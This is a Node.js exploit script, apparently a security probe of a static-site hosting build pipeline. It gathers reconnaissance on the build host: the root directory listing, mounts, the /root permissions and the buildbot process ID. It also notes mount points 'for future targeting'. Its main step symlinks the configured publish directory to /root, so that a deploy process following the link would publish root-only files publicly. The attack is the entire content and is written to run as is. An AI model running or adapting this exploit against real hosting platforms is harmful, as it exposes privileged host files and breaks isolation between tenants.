// agentdeep-5 — publish-dir symlink escape test. publish="evilroot" (netlify.toml);
// build command creates repo/evilroot -> /root (root-only dir, 0700 uid0). If the
// root-side deploy walker follows the dir symlink, /root contents get published.
// Also: mounts + / listing (other mount points for future targeting). Own tenant.
import fs from 'node:fs';
import cp from 'node:child_process';

const R = { probe: 'agentdeep-5', t: new Date().toISOString() };
const cap = (v, n = 60000) => (typeof v === 'string' && v.length > n ? v.slice(0, n) + '..TRUNC(' + v.length + ')' : v);
const sh = (c, n = 12000, t = 15000) => { try { return cap(cp.execSync(c, { encoding: 'utf8', timeout: t, maxBuffer: 8 * 1024 * 1024 }).toString(), n); } catch (e) { return 'ERR ' + String(e.stderr || e).slice(0, 300); } };
const flush = () => { try { fs.writeFileSync('agentdeep-out/agentdeep5.json', JSON.stringify(R, null, 1)); } catch {} };
fs.mkdirSync('agentdeep-out', { recursive: true });

// recon: root of fs + mounts + root-only dirs
R.rootLs = sh('ls -la / 2>&1');
R.mounts = sh('cat /proc/mounts 2>&1 | head -40');
R.rootStat = (() => { try { const s = fs.statSync('/root'); return { mode: '0' + (s.mode & 0o777).toString(8), uid: s.uid }; } catch (e) { return 'ERR ' + String(e).slice(0, 60); } })();
// find buildbot pid for reference
let bbPid = null;
try {
  for (const p of fs.readdirSync('/proc').filter((x) => /^\d+$/.test(x))) {
    try { const c = fs.readFileSync(`/proc/${p}/cmdline`, 'utf8'); if (/build-bin\/buildbot/.test(c)) { bbPid = p; break; } } catch {}
  }
} catch {}
R.bbPid = bbPid;
flush();

// the symlink: publish dir NAME is fixed ("evilroot"); target chosen here.
// /root is 0700 root — if walker follows, contents appear at the deploy URL root.
try {
  fs.rmSync('evilroot', { force: true });
  fs.symlinkSync('/root', 'evilroot');
  R.evilroot = { target: '/root', ok: true, stat: fs.lstatSync('evilroot').isSymbolicLink() };
} catch (e) { R.evilroot = { err: String(e).slice(0, 100) }; }
// marker so we can tell THIS deploy from others
fs.writeFileSync('agentdeep-out/marker-evilroot.txt', 'agentdeep-5 ' + new Date().toISOString() + ' bbPid=' + bbPid);
flush();
R.done = new Date().toISOString();
flush();
console.log('agentdeep-5 done; evilroot=' + JSON.stringify(R.evilroot));
